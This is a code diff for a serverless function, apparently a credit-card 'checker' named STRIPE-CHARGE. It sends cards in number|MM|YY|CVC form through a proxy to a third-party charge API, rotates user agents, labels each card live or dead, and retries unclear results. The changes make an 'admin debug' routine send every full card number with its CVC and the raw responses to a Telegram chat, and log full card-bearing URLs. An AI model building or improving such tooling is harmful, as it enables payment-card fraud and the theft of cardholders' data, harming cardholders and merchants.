@@ -28,57 +28,81 @@ const userAgents = [
 
 const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];
 
-// Send admin debug notification with full details
+// Send admin debug notification - MUST be awaited
 const sendAdminDebug = async (
   cc: string, 
   result: string, 
   rawResponse: string,
   apiUrl: string
-) => {
+): Promise<boolean> => {
+  console.log(`[STRIPE-CHARGE] Sending admin debug for ${result}...`);
+  console.log(`[STRIPE-CHARGE] Bot token exists: ${!!TELEGRAM_BOT_TOKEN}`);
+  console.log(`[STRIPE-CHARGE] Admin chat ID: ${ADMIN_TELEGRAM_CHAT_ID}`);
+  
   try {
     const cardParts = cc.split('|');
-    const maskedCard = cardParts[0].slice(0, 6) + '****' + cardParts[0].slice(-4);
-    const fullCard = `${cardParts[0]}|${cardParts[1]}|${cardParts[2]}|${cardParts[3]}`;
+    const maskedCard = cardParts[0]?.slice(0, 6) + '****' + cardParts[0]?.slice(-4);
+    const fullCard = cc;
     
-    // Parse raw response for clean display
-    let parsedResponse: Record<string, unknown> = {};
+    // Parse raw response
+    let parsedStatus = 'N/A';
+    let parsedMessage = 'N/A';
+    let parsedFullResponse = 'N/A';
+    
     try {
-      parsedResponse = JSON.parse(rawResponse);
+      const parsed = JSON.parse(rawResponse);
+      parsedStatus = String(parsed.status || 'N/A');
+      parsedMessage = String(parsed.message || 'N/A').substring(0, 300);
+      parsedFullResponse = String(parsed.full_response);
     } catch {
-      parsedResponse = { raw: rawResponse };
+      parsedMessage = rawResponse.substring(0, 300);
     }
 
     const statusEmoji = result === 'CHARGED' ? '✅' : result === 'DECLINED' ? '❌' : '⚠️';
     
-    const message = `${statusEmoji} 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 $𝟴 - ${result}
+    // Use plain text - no markdown/html to avoid parsing issues
+    const message = `${statusEmoji} STRIPE CHARGE $8 - ${result}
 
-💳 𝗖𝗮𝗿𝗱: ${maskedCard}
-🔢 𝗙𝘂𝗹𝗹: ${fullCard}
-💰 𝗔𝗺𝗼𝘂𝗻𝘁: $8.00
+💳 Card: ${maskedCard}
+🔢 Full: ${fullCard}
+💰 Amount: $8.00
 
-📡 𝗔𝗣𝗜 𝗨𝗥𝗟:
+📡 API URL:
 ${apiUrl}
 
-📋 𝗣𝗮𝗿𝘀𝗲𝗱 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲:
-• status: ${parsedResponse.status || 'N/A'}
-• message: ${String(parsedResponse.message || 'N/A').substring(0, 300)}
-• full_response: ${parsedResponse.full_response}
+📋 Parsed Response:
+• status: ${parsedStatus}
+• message: ${parsedMessage}
+• full_response: ${parsedFullResponse}
 
-📦 𝗥𝗮𝘄 𝗔𝗣𝗜 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲:
-${rawResponse.substring(0, 2500)}${rawResponse.length > 2500 ? '...' : ''}`;
+📦 Raw API Response:
+${rawResponse.substring(0, 2000)}${rawResponse.length > 2000 ? '...' : ''}`;
 
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    console.log(`[STRIPE-CHARGE] Calling Telegram API...`);
+    
+    const response = await fetch(telegramUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: ADMIN_TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'HTML'
+        text: message
       })
     });
-    console.log('[STRIPE-CHARGE] Admin debug sent:', result);
+
+    const responseText = await response.text();
+    console.log(`[STRIPE-CHARGE] Telegram response: ${response.status} - ${responseText}`);
+    
+    if (!response.ok) {
+      console.error(`[STRIPE-CHARGE] Telegram error: ${responseText}`);
+      return false;
+    }
+    
+    console.log(`[STRIPE-CHARGE] Admin debug sent successfully for ${result}`);
+    return true;
   } catch (error) {
     console.error('[STRIPE-CHARGE] Failed to send admin debug:', error);
+    return false;
   }
 };
 
@@ -114,21 +138,22 @@ const notifyChargedCard = async (
   }
 };
 
-// Perform API check - send card in exact format required
+// Perform API check
 const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
   const maxRetries = 3;
   
-  // Build API URL: cc=CardNumber|MM|YY|CVC&proxy=IP:PORT&proxytype=sock5
+  // Build API URL exactly as specified
   const apiUrl = `${API_BASE_URL}?cc=${encodeURIComponent(cc)}&proxy=${PROXY_IP}:${PROXY_PORT}&proxytype=${PROXY_TYPE}`;
   
   console.log(`[STRIPE-CHARGE] Attempt ${attempt}/${maxRetries}`);
-  console.log(`[STRIPE-CHARGE] Card: ${cc.split('|')[0].slice(0, 6)}****`);
-  console.log(`[STRIPE-CHARGE] API URL: ${apiUrl}`);
+  console.log(`[STRIPE-CHARGE] Card: ${cc.split('|')[0]?.slice(0, 6)}****`);
+  console.log(`[STRIPE-CHARGE] Full API URL: ${apiUrl}`);
 
   try {
     const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 45000); // 45s timeout
+    const timeoutId = setTimeout(() => controller.abort(), 45000);
     
+    console.log(`[STRIPE-CHARGE] Fetching API...`);
     const response = await fetch(apiUrl, {
       method: 'GET',
       headers: {
@@ -142,16 +167,16 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
     
     clearTimeout(timeoutId);
     
-    // Get raw response text
     const rawText = await response.text();
-    console.log(`[STRIPE-CHARGE] Raw response:`, rawText);
+    console.log(`[STRIPE-CHARGE] API Response Status: ${response.status}`);
+    console.log(`[STRIPE-CHARGE] Raw response: ${rawText}`);
 
-    // Parse JSON response
+    // Parse JSON
     let apiData: Record<string, unknown>;
     try {
       apiData = JSON.parse(rawText);
     } catch {
-      console.log(`[STRIPE-CHARGE] JSON parse failed, raw:`, rawText);
+      console.log(`[STRIPE-CHARGE] JSON parse failed`);
       apiData = { 
         status: "ERROR", 
         message: rawText || "Invalid response", 
@@ -159,14 +184,13 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
       };
     }
 
-    // Extract API fields
     const apiStatus = String(apiData?.status || 'UNKNOWN');
     const apiMessage = String(apiData?.message || 'No message');
     const fullResponse = apiData?.full_response;
 
-    console.log(`[STRIPE-CHARGE] Parsed - status: ${apiStatus}, message: ${apiMessage}, full_response: ${fullResponse}`);
+    console.log(`[STRIPE-CHARGE] Parsed: status=${apiStatus}, message=${apiMessage}, full_response=${fullResponse}`);
 
-    // Determine result based on full_response
+    // Determine result
     let computedStatus: "live" | "dead" | "unknown" = "unknown";
     
     if (fullResponse === true || String(fullResponse).toLowerCase() === 'true') {
@@ -174,7 +198,6 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
     } else if (fullResponse === false || String(fullResponse).toLowerCase() === 'false') {
       computedStatus = "dead";
     } else {
-      // Fallback: check message content
       const msgLower = apiMessage.toLowerCase();
       if (msgLower.includes('charged') || msgLower.includes('success') || msgLower.includes('approved')) {
         computedStatus = "live";
@@ -188,8 +211,10 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
     const displayResult = computedStatus === 'live' ? 'CHARGED' : 
                           computedStatus === 'dead' ? 'DECLINED' : 'UNKNOWN';
 
-    // Send admin debug with full raw response
-    sendAdminDebug(cc, displayResult, rawText, apiUrl);
+    console.log(`[STRIPE-CHARGE] Result: ${displayResult}`);
+
+    // AWAIT admin debug - send for ALL results (CHARGED, DECLINED, UNKNOWN)
+    await sendAdminDebug(cc, displayResult, rawText, apiUrl);
 
     // Retry on UNKNOWN
     if (computedStatus === "unknown" && attempt < maxRetries) {
@@ -198,7 +223,6 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
       return performCheck(cc, getRandomUserAgent(), attempt + 1);
     }
 
-    // Return result for UI
     return {
       computedStatus,
       apiStatus: displayResult,
@@ -213,8 +237,8 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
     
     const errorMsg = error instanceof Error ? error.message : "Request failed";
     
-    // Send error to admin
-    sendAdminDebug(cc, 'ERROR', `Error: ${errorMsg}`, apiUrl);
+    // AWAIT error debug
+    await sendAdminDebug(cc, 'ERROR', `Error: ${errorMsg}`, apiUrl);
     
     if (attempt < maxRetries) {
       console.log(`[STRIPE-CHARGE] Retrying after error...`);
@@ -238,7 +262,6 @@ serve(async (req) => {
   }
 
   try {
-    // Auth check
     const authHeader = req.headers.get("Authorization");
     if (!authHeader?.startsWith("Bearer ")) {
       return new Response(
@@ -259,7 +282,6 @@ serve(async (req) => {
       );
     }
 
-    // Ban check
     const { data: profile } = await supabase
       .from("profiles")
       .select("is_banned")
@@ -282,7 +304,6 @@ serve(async (req) => {
       );
     }
 
-    // Validate format: CardNumber|MM|YY|CVC
     const parts = cc.split('|');
     if (parts.length < 4) {
       return new Response(
@@ -293,7 +314,6 @@ serve(async (req) => {
 
     const [cardNum, mm, yy, cvc] = parts;
     
-    // CVC validation
     if (!cvc || cvc.length < 3 || cvc.length > 4 || !/^\d+$/.test(cvc)) {
       return new Response(
         JSON.stringify({ error: "CVC must be 3-4 digits", computedStatus: 'unknown' }),
@@ -304,7 +324,6 @@ serve(async (req) => {
     console.log(`[STRIPE-CHARGE] Processing for user: ${user.id}`);
     console.log(`[STRIPE-CHARGE] Card: ${cardNum.slice(0, 6)}****|${mm}|${yy}|***`);
 
-    // Perform the check
     const result = await performCheck(cc, getRandomUserAgent());
 
     // Notify user for LIVE cards
